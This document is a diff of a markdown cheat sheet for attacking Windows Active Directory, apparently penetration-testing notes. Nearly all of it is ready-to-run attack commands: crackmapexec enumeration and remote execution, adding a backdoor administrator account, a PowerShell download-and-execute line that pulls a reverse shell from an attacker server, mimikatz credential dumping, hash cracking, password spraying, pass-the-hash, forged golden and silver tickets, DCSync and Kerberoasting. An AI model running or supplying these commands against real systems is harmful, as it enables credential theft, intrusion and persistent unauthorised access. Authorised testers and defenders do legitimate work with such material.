@@ -1,29 +1,60 @@
-# Summary
+# Enumeration
+First, get domainname from NMAP: `nmap -A 192.168.1.50 -Pn` -> under `NetBIOS_Domain_Name: PENTESTING`
+Second, detect if the SMB signing is disabled. When SMB signing is disabled, an attacker can modify the message in transit and perform a relay attack and stealing hashes.
 
-## Password-based and Hash-based attack
-### Extracting hashes
+## Tool 1: crackmapexec
+- Built-in in kali linux
+- enumerate shares (check for READ/WRITE permissions): `crackmapexec smb 192.168.1.50-192.168.1.55 -u ippsec -p Password12345 --local-auth --shares`
+- enumerate logged on users (check if they are domain admin): `crackmapexec smb 192.168.1.50-192.168.1.55 -u ippsec -p Password12345 --loggedon-users`
+- RID enumeration: `crackmapexec smb 192.168.1.50-192.168.1.55 -u ippsec -p Password12345 --rid-brute`
+- local grp enumeration: `crackmapexec smb 192.168.1.50-192.168.1.55 -u ippsec -p Password12345 --local-groups`
+- Get the active sessions: `crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --sessions`
+- Generate a list of relayable hosts (SMB Signing disabled): `crackmapexec smb 192.168.1.0/24 --gen-relay-list output.txt`
+- Get the password policy: `crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --pass-pol`
+- Command execution(e.g. wget,ipconfig, whoami/groups): `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -X 'Invoke-WebRequest -Uri "http://192.168.1.223:8000/users.txt"'`
+- create new user for persistence(in case ippsec change pw): `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -x 'net user /add admin Password12345'`
+- add user to localgroup: `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -x 'net local group administrators'`
+- 
+## Tool 2:LdapDomainDump
+- Download: `git clone https://github.com/dirkjanm/ldapdomaindump`
+- got ldap dump: `python3 ldapdomaindump.py --user DOMAIN\\username -p Password12345 ldap://x.x.x.x:389 --no-json --no-grep -o data`
+- find Domain admin `DONT_REQ_PREAUTH` -> crack hash offline
+
+## Tool 3:enum4linux
+- Built-in in kali linux
+- Full target AD info: `enum4linux -u ippsec -p Password12345 -a 192.168.1.50`
+- Provides Domain SID, passwords of some users, share enumerations
+
+# Persistence
+## Using crackmapexec
+- Reverse shell: [Edit this from Kali to Windows](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1)
+- Transfer to windows: `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -X 'iex(New-Object Net.WebClient).DownloadString("http://192.168.223:8000/Invoke-PowerShellTcpOneLine.ps1")'`
+- Reverse shell script will autorun upcon transfer
+
+# Password-based and Hash-based attack
+## Extracting hashes
 
          SAM - Security Account Manager (Store as user accounts)  %SystemRoot%/system32/config/sam  
          NTDS.DIT (Windows Server / Active Directory - Store AD data including user accounts) %SystemRoot%/ntds/ntds.dit  
          SYSTEM (System file to decrypt SAM/NTDS.DIT)  %SystemRoot%/system32/config/system  
          Backup - Sistemas antigos como XP/2003: C:\Windows\repair\sam and C:\Windows\repair\system
 
-### Extracting Hashes in cache
+## Extracting Hashes in cache
 
          fgdump.exe
          /usr/share/windows-binaries/fgdump/fgdump.exe
 
-### Dump the credentials of all connected users, including cached hashes
+## Dump the credentials of all connected users, including cached hashes
 
          ./mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
          ./mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "vault::cred /patch" "exit"
 
-### Cracking Ad Hashes
+## Cracking Ad Hashes
 
          ntlm:   hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
          ntlmv2: hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 
-### Password Spraying
+## Password Spraying
 
  -   Create Password List  
      `crunchy <length> <length> -t <pw-core>%%%% `
@@ -31,12 +62,12 @@
 -    Spray  
      `rowbar -b rdp -s <ip>\32 -U users.txt -C pw.txt -n 1`
 
-### PASS THE Password
+## PASS THE Password
 
          crackmapexec <ip>/24 -u <user> -d <DOMAIN> -p <password>    
         
 
-### Pass the Hash
+## Pass the Hash
 
 - Allows an attacker to authenticate to a remote system or service via a user's NTLM hash
 ```
@@ -55,7 +86,7 @@ impacket-psexec '<domain>/<user>'@<IP>
 evil-winrm -i <IP> -u <user> -H <hash>
 ```
 
-### Over Pass the Hash
+## Over Pass the Hash
 
 - Allows an attacker to abuse an NTLM user hash to obtain a full Kerberos ticket granting ticket (TGT) or service ticket, which grants us access to another machine or service as that user
 
@@ -68,15 +99,15 @@ mimikatz.exe "sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2
 .\PsExec.exe \\<hostname> cmd.exe
 ```
 
-## Ticket and Token based
-### Token Impersonation
+# Ticket and Token based
+## Token Impersonation
 ```
 meterpreter load icognito  
 list_tokens  
 impersonate_token <token>  
 ```
 
-### Silver Ticket - Pass the Ticket
+## Silver Ticket - Pass the Ticket
 - It is a persistence and elevation of privilege technique in which a TGS is forged to gain access to a service in an application.
 
 - Get SID
@@ -103,7 +134,7 @@ Invoke-Mimikatz -Command '"kerberos::golden /domain:<domain> /sid:<domainsid> /t
 kerberos::list
 ```
 
-### Golden Ticket - Pass the Ticket
+## Golden Ticket - Pass the Ticket
 - It is a persistence and elevation of privilege technique where tickets are forged to take control of the Active Directory Key Distribution Service (KRBTGT) account and issue TGT's.
 
 - Get hash krbtgt
@@ -126,25 +157,25 @@ mimikatz.exe "kerberos::purge" "kerberos::golden /user:fakeuser /domain:corp.com
 psexec.exe \\dc1 cmd.exe
 ```
 
-### DCSync Attack
+## DCSync Attack
 - The DCSync attack consists of requesting a replication update with a domain controller and obtaining the password hashes of each account in Active Directory without ever logging into the domain controller.
 ```
 ./mimikatz.exe "lsadump::dcsync /user:Administrator"
 ```
 
-### AS-REP Roasting Attack - not require Pre-Authentication
+## AS-REP Roasting Attack - not require Pre-Authentication
 - kerbrute - Enumeration Users
 ```
 kerbrute userenum -d test.local --dc <dc_ip> userlist.txt
 ```
 https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt
 
--> GetNPUsers.py - Query ASReproastable accounts from the KDC
+- GetNPUsers.py - Query ASReproastable accounts from the KDC
 ```
 impacket-GetNPUsers domain.local/ -dc-ip <IP> -usersfile userlist.txt
 ```
 
-### Kerberoast
+## Kerberoast
 - impacket-GetUserSPNs
 ```
 impacket-GetUserSPNs <domain>/<user>:<password>// -dc-ip <IP> -request
@@ -165,13 +196,15 @@ or
 runas /user:<hostname>\<user> cmd.exe
 ```
 
-
 `Kerberoasting`
 
          Invoke-Kerberoast in powerview  
          Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File -filepath 'c:\temp\hashcapture.txt' -width 8000
          https://github.com/skelsec/kerberoast
          GetUserSPNs.py -request -dc-ip <RHOST> <domain>/<user>  
+
+
+
      
 
 # Tools Introduction
